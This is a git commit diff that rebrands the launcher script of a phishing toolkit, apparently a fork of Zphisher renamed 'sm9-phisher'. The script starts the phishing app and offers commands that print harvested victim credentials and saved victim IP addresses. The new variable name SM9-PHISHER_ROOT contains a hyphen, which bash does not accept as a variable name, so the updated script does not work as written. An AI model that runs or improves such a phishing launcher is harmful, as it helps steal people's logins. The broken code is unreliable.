f59129f4383360bf495541d5ac1165af17c36a94
Samarth Magdum (SM9) <101000624+HackerSM9@users.noreply.github.com>
2022-11-06 20:37:07 +0530

    Update launch.sh

--- scripts/launch.sh
+++ scripts/launch.sh
@@ -1,11 +1,11 @@
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+	SM9-PHISHER_ROOT="/data/data/com.termux/files/home/sm9-phisher"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+	export SM9-PHISHER_ROOT="/home/sm9-phisher"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
+	echo "To run sm9-phisher type \`sm9-phisher\` in your cmd"
 	echo
 	echo "Help:"
 	echo " -h | help : Print this menu & Exit"
@@ -13,16 +13,16 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat $SM9-PHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+	cat $SM9-PHISHER_ROOT/auth/ip.txt 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+	cd $SM9-PHISHER_ROOT
+	bash ./app.sh
 fi
